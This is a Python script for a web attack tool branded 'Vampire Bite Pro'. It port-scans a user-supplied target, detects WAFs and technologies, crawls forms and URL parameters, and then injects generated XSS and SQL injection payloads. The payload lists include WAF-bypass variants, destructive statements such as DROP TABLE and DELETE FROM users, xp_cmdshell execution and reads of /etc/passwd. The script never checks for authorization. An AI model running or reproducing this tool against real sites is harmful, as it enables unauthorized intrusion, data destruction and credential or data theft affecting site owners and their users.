import subprocess
import sys
import os
import json
import re
import socket
import time
import random
import threading
import base64
import hashlib
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote, unquote, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import deque

def auto_install(pkg):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])
        return True
    except:
        return False

def is_package_installed(package_name):
    try:
        __import__(package_name)
        return True
    except ImportError:
        return False

def check_deps():
    deps = ["requests", "colorama", "bs4", "urllib3"]
    for d in deps:
        if d == "bs4":
            if not is_package_installed("bs4"):
                auto_install("beautifulsoup4")
        else:
            if not is_package_installed(d):
                auto_install(d)

check_deps()

import requests
from colorama import init, Fore, Back, Style
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

# ================================================================
# SMART PAYLOAD GENERATOR - Adaptive & Context-Aware
# ================================================================

class SmartPayloadGenerator:
    """Generates payloads based on detected technology and context"""
    
    @staticmethod
    def get_xss_payloads(context="generic"):
        """XSS payloads with adaptive context"""
        
        base_payloads = [
            "<script>alert(1)</script>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "';alert(1);//",
            "<svg/onload=alert(1)>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "{{constructor.constructor('alert(1)')()}}",
            "<video><source onerror=alert(1)>",
            "<details ontoggle=alert(1)><summary>click</summary></details>",
        ]
        
        # Context-specific payloads
        context_payloads = {
            "html": [
                "<svg/onload=alert(1)>",
                "<body/onload=alert(1)>",
                "<img/src=x onerror=alert(1)>",
            ],
            "attribute": [
                "\" onmouseover=alert(1) \"",
                "' onmouseover=alert(1) '",
                "\" onfocus=alert(1) autofocus=\"",
                "' onfocus=alert(1) autofocus='",
            ],
            "javascript": [
                "alert(1)",
                "confirm(1)",
                "prompt(1)",
                "document.write(1)",
                "eval('alert(1)')",
            ],
            "url": [
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "javascript:alert(document.cookie)",
            ],
            "json": [
                "{\"key\":\"<script>alert(1)</script>\"}",
                "{\"key\":\"<img src=x onerror=alert(1)>\"}",
            ],
            "xml": [
                "<![CDATA[<script>alert(1)</script>]]>",
                "<?xml version=\"1.0\"?><script>alert(1)</script>",
            ],
        }
        
        # WAF bypass payloads
        waf_bypass = [
            "<svg/onload=alert(1)>",
            "<svg onload=alert(1) ",
            "<svg onload=alert`1`>",
            "<svg onload=alert(1)//",
            "<svg onload=alert(1)<!-->",
            "<img/src=x onerror=alert(1)>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<script>alert(1)//</script>",
            "<script>alert(1)/*/</script>",
            "jaVasCript:alert(1)",
            "javascript:alert(1)",
            "javaSCRIPT:alert(1)",
        ]
        
        all_payloads = base_payloads + waf_bypass
        
        if context in context_payloads:
            all_payloads.extend(context_payloads[context])
        
        # Generate variations
        variations = []
        for p in all_payloads[:50]:
            variations.append(p.upper())
            variations.append(p.lower())
            variations.append(p.capitalize())
            # URL encode
            variations.append(quote(p))
            # Double URL encode
            variations.append(quote(quote(p)))
        
        all_payloads.extend(variations)
        return list(dict.fromkeys(all_payloads))
    
    @staticmethod
    def get_sqli_payloads(db_type="generic"):
        """SQLi payloads with database-specific context"""
        
        base_payloads = [
            "'", "''", "\"", "\\", "`",
            "' OR '1'='1", "' OR 1=1--", "' OR '1'='1'--",
            "' OR '1'='1'#", "' OR '1'='1'/*",
            "1' AND '1'='1", "1' AND '1'='2",
            "admin' --", "admin' #", "admin'/*",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' AND SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "1' OR SLEEP(5)--",
            "' WAITFOR DELAY '00:00:05'--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND '1'='1",
            "' AND '1'='2",
            "1 AND 1=1",
            "1 AND 1=2",
            "'; DROP TABLE users--",
            "'; DELETE FROM users--",
        ]
        
        # Database-specific payloads
        db_payloads = {
            "mysql": [
                "' UNION SELECT @@version--",
                "' UNION SELECT version()--",
                "' UNION SELECT user()--",
                "' UNION SELECT database()--",
                "' UNION SELECT schema_name FROM information_schema.schemata--",
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' LOAD_FILE('/etc/passwd')--",
                "1' AND 1=CONVERT(INT, @@version)--",
            ],
            "mssql": [
                "' WAITFOR DELAY '00:00:05'--",
                "1' AND 1=CONVERT(int, @@version)--",
                "' HAVING 1=1--",
                "' GROUP BY 1 HAVING 1=1--",
                "' UNION SELECT @@version--",
                "' UNION SELECT user_name()--",
                "' UNION SELECT db_name()--",
                "'; EXEC xp_cmdshell('dir')--",
            ],
            "postgresql": [
                "' OR pg_sleep(5)--",
                "' AND 1=CAST((SELECT version()) AS INT)--",
                "' UNION SELECT version()--",
                "' UNION SELECT current_user--",
                "' UNION SELECT current_database()--",
                "' AND 1=CAST((SELECT current_user) AS INT)--",
            ],
            "oracle": [
                "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT 1 FROM DUAL))--",
                "' AND 1=UTL_INADDR.get_host_name('127.0.0.1')--",
                "' UNION SELECT banner FROM v$version--",
                "' UNION SELECT username FROM all_users--",
            ],
            "sqlite": [
                "' UNION SELECT sql FROM sqlite_master--",
                "' UNION SELECT name FROM sqlite_master--",
                "' UNION SELECT tbl_name FROM sqlite_master--",
            ],
        }
        
        all_payloads = base_payloads
        
        if db_type in db_payloads:
            all_payloads.extend(db_payloads[db_type])
        
        # WAF bypass variations
        waf_variations = [
            "'/**/OR/**/'1'='1",
            "'||'1'='1",
            "'%20OR%20'1'='1",
            "'+OR+'1'='1",
            "' AND 1=1-- -",
            "' AND 1=1#",
            "' AND 1=1/*",
            "1' AND 1=1-- -",
        ]
        all_payloads.extend(waf_variations)
        
        # Case variations
        variations = []
        for p in all_payloads[:50]:
            variations.append(p.upper())
            variations.append(p.lower())
        
        all_payloads.extend(variations)
        return list(dict.fromkeys(all_payloads))


# ================================================================
# SMART CRAWLER - Finds ALL endpoints
# ================================================================

class SmartCrawler:
    """Intelligent crawler that finds all input points"""
    
    def __init__(self, session, base_url):
        self.session = session
        self.base_url = base_url
        self.visited = set()
        self.forms = []
        self.params = set()
        self.endpoints = []
        self.queue = deque([base_url])
    
    def crawl(self, max_pages=50):
        """Crawl the website and find all input points"""
        print(f"  {Fore.CYAN}[CRAWL] Crawling {self.base_url}...{Style.RESET_ALL}")
        
        pages_crawled = 0
        
        while self.queue and pages_crawled < max_pages:
            url = self.queue.popleft()
            if url in self.visited:
                continue
            self.visited.add(url)
            pages_crawled += 1
            
            print(f"      {Fore.CYAN}[CRAWL] Page {pages_crawled}: {url[:60]}...{Style.RESET_ALL}", end='\r')
            
            try:
                r = self.session.get(url, timeout=10, verify=False)
                soup = BeautifulSoup(r.text, 'html.parser')
                
                # Extract forms
                for form in soup.find_all('form'):
                    action = form.get('action', '')
                    method = form.get('method', 'get').upper()
                    inputs = []
                    for inp in form.find_all(['input', 'textarea', 'select']):
                        name = inp.get('name', '')
                        if name:
                            inputs.append({'name': name, 'type': inp.get('type', 'text')})
                    if inputs:
                        form_url = urljoin(url, action)
                        self.forms.append({
                            'url': form_url,
                            'method': method,
                            'inputs': inputs
                        })
                        print(f"\n      {Fore.GREEN}[CRAWL] Found form: {form_url}{Style.RESET_ALL}")
                
                # Extract links
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    if href.startswith('#'):
                        continue
                    full_url = urljoin(url, href)
                    if full_url.startswith(self.base_url) and full_url not in self.visited:
                        self.queue.append(full_url)
                
                # Extract URL parameters
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    if '?' in href:
                        parsed = urlparse(urljoin(url, href))
                        if parsed.query:
                            for param in parsed.query.split('&'):
                                if '=' in param:
                                    self.params.add(param.split('=')[0])
                
                # Extract from scripts (for React/Vue/SPA)
                for script in soup.find_all('script'):
                    if script.string:
                        # Look for API endpoints
                        api_patterns = re.findall(r'["\'](/api/[^\s"\']+)["\']', script.string)
                        for api in api_patterns:
                            self.endpoints.append(api)
                        # Look for route patterns
                        route_patterns = re.findall(r'["\'](/\w+/\w+)["\']', script.string)
                        for route in route_patterns:
                            self.endpoints.append(route)
                
            except Exception as e:
                pass
            
            time.sleep(0.1)
        
        print(f"\n  {Fore.GREEN}[CRAWL] Complete! Found {len(self.forms)} forms, {len(self.params)} parameters, {len(self.endpoints)} endpoints{Style.RESET_ALL}")
        return self.forms, list(self.params), self.endpoints


# ================================================================
# WAF DETECTOR
# ================================================================

class WAFDetector:
    """Detect WAF and adjust payloads accordingly"""
    
    WAF_SIGNATURES = {
        'Cloudflare': ['cloudflare', 'cf-ray', '__cfduid', 'cf-cache-status'],
        'ModSecurity': ['modsecurity', 'mod_security', 'owasp'],
        'AWS WAF': ['x-amzn-requestid', 'aws-waf', 'aws'],
        'Sucuri': ['sucuri', 'x-sucuri-id', 'sucuri-'],
        'Akamai': ['akamai', 'x-akamai', 'akamaiedge'],
        'Imperva': ['imperva', 'incapsula', 'x-iinfo'],
        'F5': ['f5', 'big-ip', 'x-f5'],
        'Barracuda': ['barracuda', 'cuda', 'barra'],
        'Wordfence': ['wordfence', 'wf-', 'wf_'],
        'DDoS-Guard': ['ddos-guard', 'ddosguard'],
    }
    
    @staticmethod
    def detect(headers):
        detected = []
        headers_str = str(headers).lower()
        for waf, signatures in WAFDetector.WAF_SIGNATURES.items():
            for sig in signatures:
                if sig in headers_str:
                    detected.append(waf)
                    break
        return list(dict.fromkeys(detected))


# ================================================================
# MAIN SCANNER CLASS
# ================================================================

class VampireBitePro:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        self.results = {
            "target": "", "ip": "", "scan_time": "", "duration": 0,
            "open_ports": [], "web_server": "", "technologies": [],
            "waf_detected": [], "forms": [], "parameters": [],
            "xss_vulnerable": [], "sql_vulnerable": [], "files_found": []
        }
    
    def banner(self):
        print(f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                  ║
║   ██╗   ██╗ █████╗ ███╗   ███╗██████╗ ██╗██████╗ ███████╗     ██████╗ ██╗████████╗███████╗     ║
║   ██║   ██║██╔══██╗████╗ ████║██╔══██╗██║██╔══██╗██╔════╝     ██╔══██╗██║╚══██╔══╝██╔════╝     ║
║   ██║   ██║███████║██╔████╔██║██████╔╝██║██████╔╝█████╗       ██████╔╝██║   ██║   █████╗       ║
║   ╚██╗ ██╔╝██╔══██║██║╚██╔╝██║██╔═══╝ ██║██╔══██╗██╔══╝       ██╔══██╗██║   ██║   ██╔══╝       ║
║    ╚████╔╝ ██║  ██║██║ ╚═╝ ██║██║     ██║██║  ██║███████╗     ██████╔╝██║   ██║   ███████╗     ║
║     ╚═══╝  ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝     ╚═════╝ ╚═╝   ╚═╝   ╚══════╝     ║
║                                                                                                  ║
║  {Fore.MAGENTA}🐺 VAMPIRE BITE v47.0 - THE BEST EDITION 🧛‍♂️💀{Fore.RED}                                          ║
║  {Fore.GREEN}👑 Author: LORD VAMPIRE (Team Lord Leader){Fore.RED}                                             ║
║  {Fore.CYAN}⚡ Smart Crawler | Adaptive Payloads | WAF Detection | Professional Grade ⚡{Fore.RED}               ║
╚══════════════════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
    
    def get_service_name(self, port):
        services = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",
                   111:"RPC",135:"RPC",139:"NetBIOS",143:"IMAP",443:"HTTPS",445:"SMB",
                   993:"IMAPS",995:"POP3S",1433:"MSSQL",3306:"MySQL",3389:"RDP",
                   5432:"PostgreSQL",5900:"VNC",6379:"Redis",8080:"HTTP-Alt",8443:"HTTPS-Alt",27017:"MongoDB"}
        return services.get(port, "Unknown")
    
    def scan_port(self, ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((ip, port)) == 0:
                s.close()
                return port
            s.close()
        except:
            pass
        return None
    
    def port_scan(self, ip):
        print(f"\n  {Fore.CYAN}[PORT] Scanning 25 ports on {ip}...{Style.RESET_ALL}")
        ports = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1723,3306,3389,5432,5900,6379,8080,8443,27017]
        open_ports = []
        total = len(ports)
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(self.scan_port, ip, p) for p in ports]
            for i, future in enumerate(as_completed(futures), 1):
                result = future.result()
                if result:
                    open_ports.append(result)
                    print(f"      {Fore.RED}[OPEN] Port {result} [{self.get_service_name(result)}]{Style.RESET_ALL}")
                if i % 10 == 0:
                    print(f"      {Fore.CYAN}[PORT] Progress: {i}/{total} ports scanned{Style.RESET_ALL}")
        
        self.results["open_ports"] = open_ports
        print(f"  {Fore.GREEN}[PORT] Complete! Found {len(open_ports)} open ports{Style.RESET_ALL}")
        return open_ports
    
    def detect_waf(self, url):
        print(f"\n  {Fore.CYAN}[WAF] Detecting WAF...{Style.RESET_ALL}")
        try:
            r = self.session.get(url, timeout=10, verify=False)
            headers = r.headers
            detected = WAFDetector.detect(headers)
            if detected:
                print(f"      {Fore.RED}[WAF] Detected: {', '.join(detected)}{Style.RESET_ALL}")
                print(f"      {Fore.YELLOW}[WAF] Using bypass techniques...{Style.RESET_ALL}")
            else:
                print(f"      {Fore.GREEN}[WAF] No WAF detected.{Style.RESET_ALL}")
            self.results["waf_detected"] = detected
            return detected
        except:
            print(f"      {Fore.YELLOW}[WAF] Could not detect WAF.{Style.RESET_ALL}")
            return []
    
    def detect_web_server(self, url):
        print(f"\n  {Fore.CYAN}[WEB] Detecting web server...{Style.RESET_ALL}")
        try:
            r = self.session.get(url, timeout=10, verify=False)
            server = r.headers.get('Server', 'Unknown')
            print(f"      {Fore.GREEN}[WEB] Server: {server}{Style.RESET_ALL}")
            self.results["web_server"] = server
            return server
        except:
            print(f"      {Fore.RED}[WEB] Could not detect server{Style.RESET_ALL}")
            return "Unknown"
    
    def detect_technologies(self, url):
        print(f"\n  {Fore.CYAN}[TECH] Detecting technologies...{Style.RESET_ALL}")
        try:
            r = self.session.get(url, timeout=10, verify=False)
            text = r.text.lower()
            headers = r.headers
            
            techs = []
            
            # Language detection
            if '.php' in text or 'php' in str(headers):
                techs.append("PHP")
                print(f"      {Fore.GREEN}[TECH] PHP detected{Style.RESET_ALL}")
            if '.aspx' in text or 'asp.net' in text:
                techs.append("ASP.NET")
                print(f"      {Fore.GREEN}[TECH] ASP.NET detected{Style.RESET_ALL}")
            if '.jsp' in text:
                techs.append("Java/JSP")
                print(f"      {Fore.GREEN}[TECH] Java/JSP detected{Style.RESET_ALL}")
            
            # CMS detection
            if 'wp-content' in text or 'wp-includes' in text:
                techs.append("WordPress")
                print(f"      {Fore.GREEN}[TECH] WordPress detected{Style.RESET_ALL}")
            if 'joomla' in text:
                techs.append("Joomla")
                print(f"      {Fore.GREEN}[TECH] Joomla detected{Style.RESET_ALL}")
            if 'drupal' in text:
                techs.append("Drupal")
                print(f"      {Fore.GREEN}[TECH] Drupal detected{Style.RESET_ALL}")
            
            # Framework detection
            if 'react' in text:
                techs.append("React.js")
                print(f"      {Fore.GREEN}[TECH] React.js detected{Style.RESET_ALL}")
            if 'vue' in text:
                techs.append("Vue.js")
                print(f"      {Fore.GREEN}[TECH] Vue.js detected{Style.RESET_ALL}")
            if 'angular' in text:
                techs.append("Angular")
                print(f"      {Fore.GREEN}[TECH] Angular detected{Style.RESET_ALL}")
            
            # Database detection
            if 'mysql' in text or 'mysqli' in text:
                techs.append("MySQL")
                print(f"      {Fore.GREEN}[TECH] MySQL detected{Style.RESET_ALL}")
            if 'postgresql' in text or 'pgsql' in text:
                techs.append("PostgreSQL")
                print(f"      {Fore.GREEN}[TECH] PostgreSQL detected{Style.RESET_ALL}")
            if 'mssql' in text or 'sql server' in text:
                techs.append("MSSQL")
                print(f"      {Fore.GREEN}[TECH] MSSQL detected{Style.RESET_ALL}")
            
            self.results["technologies"] = techs
            return techs
        except:
            return []
    
    def test_xss_adaptive(self, url, param, value, method, context="generic"):
        """Adaptive XSS testing based on context"""
        vulnerabilities = []
        payloads = SmartPayloadGenerator.get_xss_payloads(context)
        
        for payload in payloads[:50]:  # Limit for speed
            try:
                if method == 'POST':
                    data = {param: payload}
                    resp = self.session.post(url, data=data, timeout=5, verify=False)
                else:
                    resp = self.session.get(url, params={param: payload}, timeout=5, verify=False)
                
                if payload in resp.text or payload.replace('<', '&lt;') in resp.text:
                    vulnerabilities.append({
                        'param': param,
                        'payload': payload[:60],
                        'context': context,
                        'method': method
                    })
                    print(f"        {Fore.RED}[XSS] 💀 Found in {param}: {payload[:40]}...{Style.RESET_ALL}")
                    break
            except:
                pass
            time.sleep(0.001)
        
        return vulnerabilities
    
    def test_sqli_adaptive(self, url, param, value, method, db_type="generic"):
        """Adaptive SQLi testing based on database type"""
        vulnerabilities = []
        payloads = SmartPayloadGenerator.get_sqli_payloads(db_type)
        
        sql_errors = ['mysql', 'sql syntax', 'ora-', 'postgresql', 'database error', 
                     'microsoft', 'odbc', 'sqlite', 'unclosed quotation']
        
        for payload in payloads[:30]:
            try:
                if method == 'POST':
                    start = time.time()
                    data = {param: payload}
                    resp = self.session.post(url, data=data, timeout=10, verify=False)
                    elapsed = time.time() - start
                else:
                    start = time.time()
                    resp = self.session.get(url, params={param: payload}, timeout=10, verify=False)
                    elapsed = time.time() - start
                
                for error in sql_errors:
                    if error in resp.text.lower():
                        vulnerabilities.append({
                            'param': param,
                            'payload': payload[:50],
                            'evidence': error,
                            'type': 'Error-Based'
                        })
                        print(f"        {Fore.RED}[SQLi] 💀 Found in {param}: {payload[:40]}... (evidence: {error}){Style.RESET_ALL}")
                        break
                else:
                    if elapsed >= 4:
                        vulnerabilities.append({
                            'param': param,
                            'payload': payload[:50],
                            'delay': round(elapsed, 2),
                            'type': 'Time-Based'
                        })
                        print(f"        {Fore.RED}[SQLi] ⏱️ Time-based in {param}: {elapsed:.1f}s delay{Style.RESET_ALL}")
            except:
                pass
            time.sleep(0.001)
        
        return vulnerabilities
    
    def full_scan(self, target):
        print(f"\n{Fore.CYAN}[START] Initializing professional scan...{Style.RESET_ALL}")
        self.start_time = time.time()
        self.results["target"] = target
        self.results["scan_time"] = datetime.now().isoformat()
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        parsed = urlparse(target)
        ip = parsed.hostname or target
        self.results["ip"] = ip
        
        print(f"{Fore.CYAN}[TARGET] {target}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[IP] {ip}{Style.RESET_ALL}")
        
        # PHASE 1: PORT SCAN
        print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}PHASE 1/6: PORT SCANNING{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        self.port_scan(ip)
        
        # PHASE 2: WAF DETECTION
        print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}PHASE 2/6: WAF DETECTION{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        self.detect_waf(target)
        
        # PHASE 3: TECH DETECTION
        print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}PHASE 3/6: TECHNOLOGY DETECTION{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        self.detect_web_server(target)
        techs = self.detect_technologies(target)
        
        # PHASE 4: CRAWLING
        print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}PHASE 4/6: SMART CRAWLING{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        crawler = SmartCrawler(self.session, target)
        forms, params, endpoints = crawler.crawl(max_pages=30)
        self.results["forms"] = forms
        self.results["parameters"] = params
        
        # PHASE 5: VULN TESTING
        print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}PHASE 5/6: ADAPTIVE VULNERABILITY TESTING{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        
        all_xss = []
        all_sqli = []
        
        # Test forms
        for form in forms:
            print(f"\n  {Fore.CYAN}[TEST] Testing form: {form['url']}{Style.RESET_ALL}")
            for inp in form['inputs']:
                # Determine context for XSS
                context = "generic"
                if inp['type'] == 'text':
                    context = "html"
                elif inp['type'] == 'url':
                    context = "url"
                elif inp['type'] == 'hidden':
                    context = "attribute"
                elif 'json' in str(form):
                    context = "json"
                
                # Determine database type for SQLi
                db_type = "generic"
                if 'mysql' in str(techs):
                    db_type = "mysql"
                elif 'postgresql' in str(techs):
                    db_type = "postgresql"
                elif 'mssql' in str(techs):
                    db_type = "mssql"
                
                # Test XSS
                xss_results = self.test_xss_adaptive(
                    form['url'], inp['name'], "", form['method'], context
                )
                all_xss.extend(xss_results)
                
                # Test SQLi
                sqli_results = self.test_sqli_adaptive(
                    form['url'], inp['name'], "", form['method'], db_type
                )
                all_sqli.extend(sqli_results)
        
        # Test URL parameters
        print(f"\n  {Fore.CYAN}[TEST] Testing URL parameters...{Style.RESET_ALL}")
        for param in params[:10]:
            context = "url"
            db_type = "generic"
            if 'mysql' in str(techs):
                db_type = "mysql"
            
            xss_results = self.test_xss_adaptive(target, param, "", "GET", context)
            all_xss.extend(xss_results)
            sqli_results = self.test_sqli_adaptive(target, param, "", "GET", db_type)
            all_sqli.extend(sqli_results)
        
        self.results["xss_vulnerable"] = all_xss
        self.results["sql_vulnerable"] = all_sqli
        self.results["duration"] = round(time.time() - self.start_time, 2)
        
        # PHASE 6: REPORT
        print(f"\n{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}PHASE 6/6: REPORT GENERATION{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}")
        
        self.generate_html_report(target)
        self.generate_json_report(target)
        
        # SUMMARY
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}SCAN COMPLETE!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Target: {target}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Duration: {self.results['duration']}s{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Open Ports: {len(self.results['open_ports'])}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Web Server: {self.results['web_server']}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Technologies: {', '.join(self.results['technologies']) or 'None'}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Forms Found: {len(self.results['forms'])}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Parameters: {len(self.results['parameters'])}{Style.RESET_ALL}")
        print(f"  {Fore.RED}XSS Vulnerable: {len(all_xss)}{Style.RESET_ALL}")
        print(f"  {Fore.RED}SQLi Vulnerable: {len(all_sqli)}{Style.RESET_ALL}")
        
        if all_xss:
            print(f"\n  {Fore.RED}🔥 XSS FOUND:{Style.RESET_ALL}")
            for xss in all_xss[:5]:
                print(f"    {Fore.RED}→ {xss['param']}: {xss['payload']}{Style.RESET_ALL}")
        
        if all_sqli:
            print(f"\n  {Fore.RED}🔥 SQLi FOUND:{Style.RESET_ALL}")
            for sqli in all_sqli[:5]:
                print(f"    {Fore.RED}→ {sqli['param']}: {sqli['payload']}{Style.RESET_ALL}")
        
        print(f"\n  {Fore.GREEN}[+] HTML Report: vampire_bite_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[+] JSON Report: vampire_bite_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        return self.results
    
    def generate_html_report(self, target):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"vampire_bite_report_{timestamp}.html"
        
        html = f"""<!DOCTYPE html>
<html><head><title>Vampire Bite Pro - {target}</title>
<style>
body {{ background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }}
.container {{ max-width: 1200px; margin: auto; border: 2px solid #f00; padding: 20px; }}
h1 {{ color: #f00; text-align: center; }}
h2 {{ color: #f00; border-bottom: 2px solid #f00; }}
.critical {{ color: #f00; }}
table {{ width: 100%; border-collapse: collapse; }}
th, td {{ border: 1px solid #333; padding: 8px; text-align: left; }}
th {{ background: #f00; color: #fff; }}
</style>
</head>
<body>
<div class="container">
<h1>🧛‍♂️ VAMPIRE BITE PRO - SECURITY REPORT</h1>
<p><strong>Target:</strong> {target}</p>
<p><strong>IP:</strong> {self.results['ip']}</p>
<p><strong>Scan Time:</strong> {self.results['scan_time']}</p>
<p><strong>Duration:</strong> {self.results['duration']}s</p>

<h2>🔌 OPEN PORTS ({len(self.results['open_ports'])})</h2>
<table>
<tr><th>Port</th><th>Service</th></tr>
{''.join([f"<tr><td class='critical'>{p}</td><td>{self.get_service_name(p)}</td></tr>" for p in self.results['open_ports']])}
</table>

<h2>🖥️ SYSTEM INFORMATION</h2>
<table>
<tr><th>Component</th><th>Value</th></tr>
<tr><td>Web Server</td><td>{self.results['web_server']}</td></tr>
<tr><td>Technologies</td><td>{', '.join(self.results['technologies']) or 'None'}</td></tr>
<tr><td>WAF Detected</td><td>{', '.join(self.results['waf_detected']) or 'None'}</td></tr>
</table>

<h2>📋 DISCOVERED FORMS ({len(self.results['forms'])})</h2>
{''.join([f"<div style='background:#111; padding:10px; margin:10px 0; border-left:4px solid #00f;'><strong>{f['url']}</strong><br>Method: {f['method']}<br>Inputs: {', '.join([i['name'] for i in f['inputs']])}</div>" for f in self.results['forms'][:10]])}

<h2>⚠️ VULNERABILITIES</h2>
<h3>XSS ({len(self.results['xss_vulnerable'])})</h3>
{''.join([f"<div style='background:#111; padding:10px; margin:10px 0; border-left:4px solid #f00;'><strong>{v['param']}</strong><br>{v['payload']}<br><span style='color:#ff6600;'>Context: {v.get('context', 'generic')}</span></div>" for v in self.results['xss_vulnerable']])}
<h3>SQLi ({len(self.results['sql_vulnerable'])})</h3>
{''.join([f"<div style='background:#111; padding:10px; margin:10px 0; border-left:4px solid #ff0;'><strong>{v['param']}</strong><br>{v['payload']}<br><span style='color:#ff6600;'>Type: {v.get('type', 'Unknown')}</span></div>" for v in self.results['sql_vulnerable']])}

<div class="footer">
<p>🐺 Created by LORD VAMPIRE | Team Lord</p>
<p>⚡ Professional Edition | Adaptive Testing | Smart Crawler</p>
</div>
</div>
</body></html>"""
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        return filename
    
    def generate_json_report(self, target):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"vampire_bite_report_{timestamp}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, default=str)
        return filename
    
    def run(self):
        self.banner()
        while True:
            print(f"""
{Fore.RED}╔════════════════════════════════════════════════════════════════════════════════╗
║  {Fore.GREEN}[1]{Style.RESET_ALL} 🧛‍♂️ {Fore.RED}VAMPIRE BITE PRO{Style.RESET_ALL} - Complete Scan (Best)                    {Fore.RED}║
║  {Fore.GREEN}[2]{Style.RESET_ALL} 🔍 Quick Scan (Ports + Server)                                    {Fore.RED}║
║  {Fore.GREEN}[0]{Style.RESET_ALL} 🚪 Exit                                                         {Fore.RED}║
╚════════════════════════════════════════════════════════════════════════════════╝
""")
            choice = input(f"{Fore.RED}┌─[{Fore.YELLOW}VAMPIRE{Fore.RED}]~[{Fore.GREEN}> {Style.RESET_ALL}")
            
            if choice == "1":
                target = input(f"{Fore.CYAN}Target URL: {Style.RESET_ALL}")
                self.full_scan(target)
                input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")
            elif choice == "2":
                target = input(f"{Fore.CYAN}Target URL: {Style.RESET_ALL}")
                if not target.startswith(('http://', 'https://')):
                    target = 'https://' + target
                ip = urlparse(target).hostname
                self.port_scan(ip)
                self.detect_web_server(target)
                input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")
            elif choice == "0":
                print(f"\n{Fore.RED}🧛‍♂️ VAMPIRE BITE OUT. THE WEB BLEEDS!{Style.RESET_ALL}")
                break

if __name__ == "__main__":
    hunter = VampireBitePro()
    hunter.run()
